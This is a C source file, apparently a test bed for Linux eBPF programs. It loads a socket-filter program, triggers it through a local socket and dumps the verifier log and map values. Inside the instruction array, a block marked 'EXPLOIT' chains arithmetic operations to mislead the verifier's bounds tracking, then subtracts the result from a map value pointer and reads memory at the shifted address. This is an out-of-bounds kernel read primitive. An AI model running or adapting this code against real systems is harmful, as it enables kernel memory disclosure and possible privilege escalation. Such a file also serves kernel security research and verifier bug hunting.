/*
  Simple test bed for writing eBPF programs and dumping verifier logs
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <assert.h>
#include <linux/bpf.h>
#include <linux/bpf_common.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <errno.h>
#include <error.h>
#include "bpf_insn.h"


int bpf(unsigned cmd, union bpf_attr *attr, size_t size)
{
    // 321 == sys_bpf
    // man 2 bpf
    return syscall(321, cmd, attr, size);
}

#define VALUE_SIZE 8
#define ELEMS 2

int setup_map(int *map_fd) {

    uint64_t key = 0;
    union bpf_attr map = {
	.map_type = BPF_MAP_TYPE_ARRAY,
	.key_size = 4,
	.value_size = VALUE_SIZE,
	.max_entries = ELEMS,
    };

    *map_fd = (__u32)bpf(BPF_MAP_CREATE, &map, sizeof(map));
    if (*map_fd < 0) {
	perror("Error in setup_map");
	printf("map_fd was: %d\n", *map_fd);
	return 1;
    }
    return 0;
}

int setup_debug_map(int *map_fd) {

    uint64_t key = 0;
    union bpf_attr map = {
	.map_type = BPF_MAP_TYPE_ARRAY,
	.key_size = 4,
	.value_size = VALUE_SIZE,
	.max_entries = 1
    };

    *map_fd = (__u32)bpf(BPF_MAP_CREATE, &map, sizeof(map));
    if (*map_fd < 0) {
	perror("Error in setup_map");
	printf("map_fd was: %d\n", *map_fd);
	return 1;
    }
    return 0;
}


static int setup_listener_sock()
{
    
	int sock_fd = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK | SOCK_CLOEXEC, 0);
	if (sock_fd < 0) {
	    printf("[-] Socket creation failed.\n");
	    perror("Error in setup_listener_sock");	    
	    return sock_fd;
	}

	struct sockaddr_in serverAddr;
	serverAddr.sin_family = AF_INET;
	serverAddr.sin_port = htons(1337);
	serverAddr.sin_addr.s_addr = htonl(INADDR_ANY);

	int err = bind(sock_fd, (struct sockaddr *)&serverAddr, sizeof(serverAddr));
	if (err < 0)
	{
	    printf("[-] Bind failed.\n");
	    perror("Error in setup_listener_sock");	    	    
	    return err;
	}
	err = listen(sock_fd, 32);
	if (err < 0) {
	    printf("[-] Listen failed.\n");
	    perror("Error in setup_listener_sock");	    	    
	    return err;
	}
	return sock_fd;
}


static int setup_send_sock()
{
    int sendsock_fd = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, 0);
    if (sendsock_fd < 0) {
	printf("[-] send_sock failed.\n");
	perror("Error in setup_listener_sock");	    	
    }
    return sendsock_fd;
}


// loads a prog and returns the FD
static int load_prog(struct bpf_insn *instructions, size_t insn_count)
{
       uint32_t LOG_SIZE = 1 << 28;
	char *logbuf = malloc(LOG_SIZE);

	union bpf_attr prog = {};
	prog.license = (uint64_t)"GPL";
	/* strncpy(prog.prog_name, "helloworld", 10); */
	prog.prog_type = BPF_PROG_TYPE_SOCKET_FILTER;
	prog.insn_cnt = insn_count;
	prog.insns = (uint64_t)instructions;
	prog.log_level = 3;
	prog.log_size = LOG_SIZE;
	prog.log_buf = (__aligned_u64)logbuf;
	// load the BPF program
	int prog_fd = bpf(BPF_PROG_LOAD, &prog, sizeof(prog));

	// Print verifier log
	printf("%s\n", logbuf);
	free(logbuf);
	if (prog_fd < 0) {
	    printf("[-] Load of bpf prog failed.\nerr: %d\n", prog_fd);
	    perror("Error in load_prog");	    	    
	}

	return prog_fd;
}

static int trigger_prog(int prog_fd)
{
	int listener_sock = setup_listener_sock();
	int send_sock = setup_send_sock();

	if (listener_sock < 0 || send_sock < 0) {
	    printf("[-] setup of sockets to trigger program failed.\n");
	    perror("Error in trigger_prog");	    	    
	    return 0;
	}

	if (setsockopt(listener_sock, SOL_SOCKET, SO_ATTACH_BPF, &prog_fd, sizeof(prog_fd)) < 0) {
	    printf("[-] Failed to attach program to socket.\n");
	    perror("Error in trigger_prog");	    	    	    
	    return 0;
	}

	// trigger execution by connecting to the listener socket
	struct sockaddr_in serverAddr;
	serverAddr.sin_family = AF_INET;
	serverAddr.sin_port = htons(1337);
	serverAddr.sin_addr.s_addr = htonl(INADDR_ANY);

	if (connect(send_sock, (struct sockaddr *)&serverAddr, sizeof(serverAddr)) != 0) {
	    printf("[*] connect failed (as expected)\n");
	}

	close(listener_sock);
	close(send_sock);
	return 1;

}


uint64_t lookup_first_bytes( int map_fd, uint32_t index, uint64_t offset) {
    uint64_t buf[VALUE_SIZE / 8];
    // Read value from map

    union bpf_attr lookup_map = {
	.map_fd = map_fd,
	.key = (uint64_t)&index,
	.value = (uint64_t)&buf
    };

    if (bpf(BPF_MAP_LOOKUP_ELEM, &lookup_map, sizeof(lookup_map))) {
	perror("Error in lookup:");
    }    
    return buf[offset];

    
}

/*
Grab the entry of `elem_size` bytes at index `index` from the map pointed to by `map_fd`
Search through it looking for `needle`
returns: 0 if not found, 1 if found
 */
int grep_for_bytes(int map_fd, uint32_t index, uint32_t elem_size, uint64_t needle) {

    uint64_t buf[elem_size / 8];
    union bpf_attr lookup_map = {
	.map_fd = map_fd,
	.key = (uint64_t) &index,
	.value = (uint64_t)&buf
    };

    if (bpf(BPF_MAP_LOOKUP_ELEM, &lookup_map, sizeof(lookup_map))) {
	perror("Error in lookup");
    }

    uint32_t elems = elem_size / 8;
    for (int i = 0; i < elems; i++) {
	if (buf[i] == needle) {
	    return 1;
	}
    }
    return 0;
}

int main(int argc, char **argv) {
    // Create map
    int map_fd;
    if (setup_map(&map_fd)) {
	printf("[-] Map creation failed.\n");
	return 1;
    }
    printf("[+] map setup successfully.\n");


    // Write your beautiful programs here
    struct bpf_insn prog[] = {
	// Start by setting up a pointer to a map, so we can dump values
	BPF_LD_MAP_FD(BPF_REG_1, map_fd),
	BPF_MOV64_IMM(BPF_REG_0, 0), // key
	// Store key/index on stack
	BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -4),
	// make r2 a pointer to key Stack pointer in r2
	BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
	// Adjust it by subbing 4
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
	// Get the pointer
	BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),
	/* Verify the pointer is valid */
	BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
	BPF_EXIT_INSN(),

	// Do some instructions of which we want to dump the result
	/* BPF_MOV64_IMM(BPF_REG_6, 1), // r6 = 1 */
	/* BPF_MOV64_IMM(BPF_REG_7, -1), // r7 = -1 */
	/* BPF_ALU64_REG(BPF_LSH, BPF_REG_6, BPF_REG_7), // r6 <<= r7 */
	/* BPF_ALU64_IMM(BPF_ARSH, BPF_REG_6, 1), // r6 <<= r7 */
       BPF_MOV64_IMM(BPF_REG_6, 0),
       BPF_MOV64_IMM(BPF_REG_7, 0),

       BPF_ALU32_REG(BPF_DIV, BPF_REG_6, BPF_REG_7),
       BPF_ALU32_REG(BPF_RSH, BPF_REG_6, BPF_REG_7),
       BPF_ALU64_IMM(BPF_XOR, BPF_REG_7, 405024868),
       BPF_ALU64_IMM(BPF_RSH, BPF_REG_6, 24),
       BPF_ALU64_IMM(BPF_OR, BPF_REG_6, 1134467273),
       BPF_ALU32_REG(BPF_AND, BPF_REG_6, BPF_REG_7),
       BPF_ALU64_IMM(BPF_RSH, BPF_REG_6, 18),
       BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, 42),

       /* BPF_ALU32_REG(BPF_ARSH, BPF_REG_6, BPF_REG_9), */
       /* EXPLOIT */
       BPF_ALU64_REG(BPF_SUB, BPF_REG_0, BPF_REG_6),
       BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 0),
       BPF_LD_MAP_FD(BPF_REG_1, map_fd),
       BPF_MOV64_IMM(BPF_REG_0, 0), // key
       // Store key/index on stack
       BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -4),
       // make r2 a pointer to key Stack pointer in r2
       BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
       // Adjust it by subbing 4
       BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
       // Get the pointer
       BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),
       /* Verify the pointer is valid */
       BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
       BPF_EXIT_INSN(),

	// Dump r6 to the debug map
	BPF_STX_MEM(BPF_DW, BPF_REG_0, BPF_REG_6, 0),
	
	// Exit
	BPF_MOV64_IMM(BPF_REG_0, 0),
	BPF_EXIT_INSN(),
    };
    
    int prog_fd = load_prog(prog, sizeof(prog) / sizeof(prog[0]));
    if (prog_fd < 0) {
	exit(1);
    }
    printf("[+] Program loaded...\n");

    // Trigger the program
    int nouse = trigger_prog(prog_fd);
    printf("[+] Program triggered...\n");

    /* Dump the debug map */
    uint64_t debug_buf[ELEMS];
    for (int i = 0; i < ELEMS; i++) {
        uint64_t valbuf[1];

        union bpf_attr debug_lookup_map = {
        .map_fd = map_fd,
        .key = (uint64_t)&i,
        .value = (uint64_t)&valbuf
        };

        if (bpf(BPF_MAP_LOOKUP_ELEM, &debug_lookup_map, sizeof(debug_lookup_map))) {
        perror("Error in debug_lookup:");
        }
        debug_buf[i] = valbuf[0];
    }
    for (int i = 0; i < ELEMS; i++) {
        printf("Dumping debug map..\n");
        printf("idx %d:\n unsigned: %lu\n signed: %ld\n", i, debug_buf[i], debug_buf[i]);
    }
    sleep(1000);
    return 0;
}
